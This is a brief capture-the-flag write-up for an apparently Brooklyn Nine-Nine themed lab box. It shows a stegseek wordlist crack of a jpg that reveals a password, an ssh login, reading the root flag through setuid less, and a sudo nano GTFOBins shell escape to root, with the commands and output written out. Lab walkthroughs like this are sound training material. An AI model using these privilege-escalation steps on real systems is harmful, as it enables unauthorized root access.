## Info
### Credential
- jake
- holt:fluffydog12@ninenine
- amy

## Path
### User
1. The comment in the html tell us to do some steg. Since it's a `.jpg` file, use `stegseek` to crack it and get Holt's password.
```
$ stegseek brooklyn99.jpg /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".

$  cat brooklyn99.jpg.out
Holts Password:
fluffydog12@ninenine

Enjoy!!
```
2. Use Holt's credential to login from ssh, and get the user flag!
### Root 1
1. Found `/bin/less` has setuid and the owner is root, so we can use it to read the flag.
```
$ less -r /root/root.txt
```
### Root 2
2. Another way to gain root is that we can run nano using sudo. So follow the GTFOBins and gain root.
```
$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
$ sudo nano
^R^X
reset; sh 1>&0 2>&0
# whoami
root
``` 
